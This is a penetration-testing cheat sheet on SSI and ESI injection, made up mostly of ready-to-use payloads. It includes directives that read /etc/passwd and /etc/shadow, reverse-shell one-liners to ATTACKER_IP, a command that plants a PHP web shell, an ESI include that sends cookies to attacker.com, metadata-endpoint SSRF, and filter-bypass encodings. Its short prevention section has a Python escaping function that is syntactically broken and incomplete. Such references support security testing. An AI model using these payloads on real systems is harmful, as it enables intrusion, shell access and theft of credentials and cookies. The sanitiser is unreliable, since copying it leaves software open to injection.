# Server Side Include (SSI) Injection

## Description
Server Side Includes (SSI) are directives that allow dynamic content generation in HTML pages. SSI injection occurs when user input is included in pages processed for SSI directives, potentially allowing attackers to execute commands, read files, or inject content.

## SSI Directive Format

```html
<!--#directive param="value" -->
```

## Common Directives

### Information Disclosure
```html
<!-- Print server date -->
<!--#echo var="DATE_LOCAL" -->

<!-- Print document name -->
<!--#echo var="DOCUMENT_NAME" -->

<!-- Print document URI -->
<!--#echo var="DOCUMENT_URI" -->

<!-- Print query string -->
<!--#echo var="QUERY_STRING_UNESCAPED" -->

<!-- Print server software -->
<!--#echo var="SERVER_SOFTWARE" -->

<!-- Print all variables -->
<!--#printenv -->
```

### File Inclusion
```html
<!-- Include file -->
<!--#include file="header.html" -->

<!-- Include virtual path -->
<!--#include virtual="/footer.html" -->

<!-- Include sensitive files -->
<!--#include file="/etc/passwd" -->
<!--#include virtual="/etc/passwd" -->
```

### Command Execution
```html
<!-- Execute command -->
<!--#exec cmd="ls -la" -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#exec cmd="id" -->

<!-- Execute CGI script -->
<!--#exec cgi="/cgi-bin/script.cgi" -->
```

### File Size and Modification
```html
<!-- File size -->
<!--#fsize file="document.html" -->
<!--#fsize virtual="/path/to/file" -->

<!-- Last modified -->
<!--#flastmod file="document.html" -->
<!--#flastmod virtual="/path/to/file" -->
```

### Configuration Directives
```html
<!-- Set error message -->
<!--#config errmsg="Error occurred" -->

<!-- Set time format -->
<!--#config timefmt="%Y-%m-%d %H:%M:%S" -->

<!-- Set file size format -->
<!--#config sizefmt="bytes" -->
```

## Exploitation Payloads

### Basic Information Gathering
```html
<!--#echo var="DATE_LOCAL" -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="SERVER_SOFTWARE" -->
<!--#printenv -->
```

### File Reading
```html
<!--#include file="/etc/passwd" -->
<!--#include virtual="/etc/passwd" -->
<!--#include file="../../../etc/passwd" -->
<!--#exec cmd="cat /etc/passwd" -->
```

### Command Execution
```html
<!--#exec cmd="id" -->
<!--#exec cmd="whoami" -->
<!--#exec cmd="ls -la /" -->
<!--#exec cmd="uname -a" -->
<!--#exec cmd="cat /etc/shadow" -->
```

### Reverse Shell
```html
<!--#exec cmd="bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" -->
<!--#exec cmd="nc -e /bin/sh ATTACKER_IP PORT" -->
<!--#exec cmd="mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f" -->
```

### Web Shell
```html
<!--#exec cmd="echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php" -->
```

## Edge Side Includes (ESI) Injection

ESI is used by caching servers/CDNs. Different from SSI but similar concept.

### Basic ESI Injection
```html
<!-- Include external content -->
<esi:include src="http://attacker.com/malicious" />

<!-- Include with alternative -->
<esi:include src="http://attacker.com/payload" alt="http://attacker.com/backup" />
```

### Blind Detection
```html
<esi:include src="http://attacker.com/detect" />
```

### XSS via ESI
```html
<esi:include src="http://attacker.com/xss.html" />
<!-- Where xss.html contains: <script>alert(1)</script> -->
```

### Cookie Stealing
```html
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE)" />
```

### SSRF via ESI
```html
<esi:include src="http://localhost:8080/admin" />
<esi:include src="http://169.254.169.254/latest/meta-data/" />
```

### Header Injection
```html
<esi:include src="http://example.com" dca="none" />
```

## Vulnerable Software

### ESI-Capable Servers
| Software | Includes | Vars | Cookies | Headers | Blind Detection |
|----------|----------|------|---------|---------|-----------------|
| Squid | Yes | Yes | Yes | Yes | No |
| Varnish | Yes | No | No | Yes | No |
| Fastly | Yes | No | No | No | No |
| Akamai | Yes | Yes | Yes | No | Yes |
| Node.js esi | Yes | Yes | Yes | No | No |

### SSI-Enabled Web Servers
- Apache with mod_include
- Nginx with ngx_http_ssi_module
- IIS with SSI enabled

## Detection Methods

### Check Server Response Headers
```bash
# Look for SSI indicators
curl -I https://target.com

# Check for .shtml extensions
# Check for server configuration
```

### Test Payloads
```html
<!-- Basic test -->
<!--#echo var="DATE_LOCAL" -->

<!-- If reflected, test exec -->
<!--#exec cmd="id" -->
```

### Error Message Analysis
```
# SSI errors may reveal:
- "mod_include" references
- SSI configuration details
- Directive parsing errors
```

## Bypass Techniques

### Encoding
```html
%3C%21--%23exec%20cmd%3D%22id%22%20--%3E
```

### Case Variations
```html
<!--#EXEC CMD="id" -->
<!--#Exec Cmd="id" -->
```

### Whitespace Variations
```html
<!--#exec  cmd="id"  -->
<!-- #exec cmd="id" -->
```

### Alternative Syntax
```html
<!--#exec cmd='id' -->
<!--#exec cmd=id -->
```

## Testing Methodology

### 1. Identify SSI Processing
```
- Check for .shtml, .stm, .shtm extensions
- Look for SSI indicators in source
- Test basic echo directive
```

### 2. Test Information Disclosure
```html
<!--#printenv -->
<!--#echo var="SERVER_SOFTWARE" -->
```

### 3. Test File Inclusion
```html
<!--#include file="/etc/passwd" -->
```

### 4. Test Command Execution
```html
<!--#exec cmd="id" -->
```

## Prevention

### Apache Configuration
```apache
# Disable SSI
Options -Includes

# Restrict to specific directories
<Directory "/var/www/html/ssi">
    Options +Includes
    XBitHack on
</Directory>

# Disable exec
Options IncludesNOEXEC
```

### Nginx Configuration
```nginx
# Disable SSI globally
ssi off;

# Enable only in specific location
location /ssi/ {
    ssi on;
    ssi_types text/html;
}
```

### Input Validation
```python
# Escape SSI directives in user input
def escape_ssi(input):
    return input.replace('<!--', '&lt;!--')
                .replace('-->', '--&gt;')
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Include%20Injection
- https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection
- https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/
